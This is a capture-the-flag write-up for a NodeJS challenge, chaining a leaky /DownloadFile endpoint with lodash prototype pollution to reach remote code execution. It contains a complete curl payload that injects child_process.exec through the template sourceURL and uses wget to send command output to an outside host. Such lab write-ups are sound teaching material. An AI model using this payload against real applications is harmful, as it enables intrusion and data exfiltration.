# Elz3ama-CTF

By inspecting the HTTP responses, we figure out that the application is written in NodeJs.


![Application](http://snappyimages.nextwavesrl.netdna-cdn.com/img/4f786f0c3099ae9aad02921d1aab97b9.png)

Next By inspecting the comments we see the below comments:

<!-- Ziko: I could not push the code to the CI/CD pipeline, so NexusIQ was not executed on this project. Would you please check it for me ? the endpoint for getting files is: /DownloadFile/${file}

We can then figure out that there is a download function that takes the file name and download the file. knowing that the application is written in NodeJS, we can assume that the file 'package.json'.

by going to the following link:

> http://localhost:3000/DownloadFile/package.json

We can simply download the 'package.json' file and then read all of the dependencies.

On the line number: 7. we can spot that the main file used in the application is called 'index.js'

By making use of the same 'DownloadFile' link to download the source code of the application:

> http://localhost:3000/DownloadFile/index.js

![sourcecode](http://snappyimages.nextwavesrl.netdna-cdn.com/img/4982e1c2fc989d1e2ed6017190ff8c9d.png)


By searching around you can find that the application is making use of a vulnerable version of 'lodash' library which is vulnerable to prototype pollution and leads to RCE due to the usage of 'template'.

> https://github.com/lodash/lodash/pull/4518

The full payload that can leads to RCE
> curl -D- localhost:3000/pipeline -H 'Content-Type: application/json' -d $'{"constructor": {"prototype": {"sourceURL": "\u2028\u2029global.process.mainModule.require(\'child_process\').exec(\'wget http://sherif.ninja:8080/$(ls)\')"}}}'

On the other hand on the webserver runnning by the player they can receive the output of the command 'ls'
on the http logs

![flag-file](http://snappyimages.nextwavesrl.netdna-cdn.com/img/98d108a92b9e49d3934f80a186abe1d4.png)

by making use of the 'DownloadFile' function, we can simply read the flag by the following link:

http://localhost:3000/DownloadFile/cfl4g_n7w_z3ama_file_downloaded
